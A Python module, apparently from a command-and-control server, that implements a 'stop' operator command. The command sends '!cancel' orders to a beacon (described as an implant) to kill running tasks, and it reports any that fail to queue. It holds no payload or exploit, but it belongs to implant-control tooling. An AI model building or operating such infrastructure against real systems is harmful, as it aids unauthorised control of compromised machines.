"""stop — 终止 beacon 上正在运行的任务(死循环/持久任务):

stop <beacon_id> <task_id>   终止指定运行中任务
stop <beacon_id> -all        终止该 beacon 全部运行中任务

原理: 下发 !cancel 指令 → 植入物向目标任务线程异步抛 KeyboardInterrupt
(ctypes SetAsyncExc)——`while True: pass` 类死循环可被打断;任务代码若
全捕获 BaseException 则无效;阻塞在 socket.recv 的线程延迟到 IO 返回。
被取消的任务不产生结果,从运行中列表移除。
查看运行中任务: tasks <beacon_id> 或 beacon 详情。
"""

from server.task_queue import Task


def run(disp, args):
    if len(args) < 2:
        return "[!] usage: stop <beacon_id> <task_id | -all>"
    bid = args[0]
    rec = disp.mgr.get_client(bid)
    if rec is None:
        return f"[!] beacon 不存在: {bid}"
    targets = [a for a in args[1:] if a != "-all"]
    if "-all" in args[1:]:
        targets = list(getattr(rec, "running_tasks", []) or [])
    if not targets:
        return "[!] 无运行中任务(task_id 列表见 tasks 命令)"
    ok = 0
    failed = []
    for tid in targets:
        task = Task(code=f"!cancel {tid}")
        # R31:push_task 队列满时返回 "[!] ..." —— 此前丢弃返回值一律报「已下发 N 条」,
        # 操作者以为已终止实际一条没发
        msg = disp.push_task(bid, task)
        if isinstance(msg, str) and msg.startswith("[+]"):
            ok += 1
        else:
            failed.append(tid)
    if failed:
        return (f"[!] 终止指令下发 {ok}/{len(targets)} 成功,{len(failed)} 条入队失败"
                f"(任务队列已满):{', '.join(failed)}")
    return f"[+] 已下发 {ok} 条终止指令 → {bid}: {', '.join(targets)}"
